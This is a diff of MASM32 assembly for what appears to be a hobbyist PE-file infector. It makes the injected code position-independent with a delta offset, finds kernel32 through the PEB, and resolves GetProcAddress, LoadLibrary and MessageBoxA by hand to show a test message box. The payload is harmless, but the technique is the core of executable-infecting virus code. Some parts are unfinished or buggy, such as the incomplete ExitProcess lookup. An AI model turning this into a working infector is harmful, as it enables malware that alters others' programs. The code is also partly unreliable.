@@ -16,6 +16,13 @@ includelib	\masm32\lib\kernel32.lib
 include		\masm32\include\msvcrt.inc
 includelib	\masm32\lib\msvcrt.lib
 
+; Macro to avoid repetition when pushing offset with delta
+PDELTA		macro	Addr
+			mov	eax, Addr
+			add	eax, ebp
+			push	eax
+		endm
+
 
 .data
 PeFile			dd	?
@@ -39,24 +46,16 @@ NewSectionName	db	"ImIn",0
 
 
 
-
 .code
 
 inject:
 
-sGetProcAddress	db	'GetProcAddress', 0 
-sMessageBoxA	db	'MessageBoxA', 0 
-sLoadLibrary	db	'LoadLibraryA', 0 
-sHelloWorld	db	'Hello World (MsgBox Without include lib BIATCH!)', 0
-sUser32		db	'USER32.DLL', 0
-sKernel32	db	'KERNEL32.DLL', 0
-pMessageBoxA	dd	?
-pKernel32	dd	?
-pUser32		dd	?
-pLoadLibrary	dd	?
-pGetProcAddress	dd	?
-
 start:
+; Delta offset for PIC
+call	delta
+delta:
+pop	ebp ; Retrieve eip
+sub	ebp, delta ; Ebp + Label to get the data
 
 ; GETTING KERNEL32 FUNCTIONS
 ; GET BASE ADDRESS OF KERNEL32
@@ -67,7 +66,7 @@ mov 	ebx, [ebx + 014h] ; LBR 1st
 mov 	ebx, [ebx] ; 2nd entry
 mov 	ebx, [ebx] ; 3rd entry : kernel32 module (I hope so)
 mov	ebx, [ebx + 010h] ; Base address Kernel32 (Holy grail ?)
-mov	pKernel32, ebx
+mov	[ebp + pKernel32], ebx
 
 ; GET PROPERTIES DLL
 mov	esi, [ebx + 03Ch] ; PE Header offset
@@ -79,8 +78,10 @@ add	edi, ebx
 mov	ecx, [esi + 014h] ; Number of functions
 
 ; LOOP FROM FUNCTIONS AND GET LoadLibrary & GetProcAddress
+mov	eax, ebp
+add	eax, offset sGetProcAddress
+mov	edx, eax ; Search function
 xor	eax, eax ; Counter
-mov	edx, offset sGetProcAddress ; Search function
 checkFunctionName:
 mov	ecx, [edi] ; Function name offset
 add	ecx, ebx
@@ -97,27 +98,32 @@ mov	edx, [esi + 01Ch] ; List of entry point
 add	edx, ebx
 mov	edx, [edx + eax * 4 + 4] ; Entry point of function (TODO - Why the fuck +4 ?)
 add	edx, ebx
-mov	pGetProcAddress, edx
+mov	[ebp + pGetProcAddress], edx
 
 ; Test on LoadLibrary
-push	offset sLoadLibrary
-push	pKernel32
-call	pGetProcAddress ; GetProcAddress(kernel32, "LoadLibrary")
-mov	pLoadLibrary, eax
-push	offset sUser32
-call	pLoadLibrary ; LoadLibrary("user32.dll")
-mov	pUser32, eax
-push	offset sMessageBoxA
-push	pUser32
-call	pGetProcAddress ; GetProcAddress(user32.dll, "MessageBoxA")
-mov	pMessageBoxA, eax
+PDELTA	offset sLoadLibrary
+push	[ebp + pKernel32]
+call	[ebp + pGetProcAddress] ; GetProcAddress(kernel32, "LoadLibrary")
+mov	[ebp + pLoadLibrary], eax
+PDELTA	offset sUser32
+call	[ebp + pLoadLibrary] ; LoadLibrary("user32.dll")
+mov	[ebp + pUser32], eax
+PDELTA	offset sMessageBoxA
+push	[ebp + pUser32]
+call	[ebp + pGetProcAddress] ; GetProcAddress(user32.dll, "MessageBoxA")
+mov	[ebp + pMessageBoxA], eax
 push	0
-push	offset sHelloWorld
-push	offset sHelloWorld
+PDELTA	offset sHelloWorld
+PDELTA	offset sHelloWorld
 push	0
-call	eax
+call	[ebp + pMessageBoxA]
 
-jmp	begin
+; Get ExitProcess
+PDELTA	offset sExitProcess
+push	[ebp + pUser32]
+push	[ebp + pGetProcAddress]
+
+; jmp	begin
 
 ; EXIT TEST
 push	0
@@ -141,8 +147,18 @@ xor	eax, eax
 nomatch:
 ret
 
-sTestStr:
-dw	042h
+sExitProcess	db	'ExitProcess', 0 
+sGetProcAddress	db	'GetProcAddress', 0 
+sMessageBoxA	db	'MessageBoxA', 0 
+sLoadLibrary	db	'LoadLibraryA', 0 
+sHelloWorld	db	'Hello World (MsgBox Without include lib BIATCH!)', 0
+sUser32		db	'USER32.DLL', 0
+sKernel32	db	'KERNEL32.DLL', 0
+pMessageBoxA	dd	?
+pKernel32	dd	?
+pUser32		dd	?
+pLoadLibrary	dd	?
+pGetProcAddress	dd	?
 
 
 
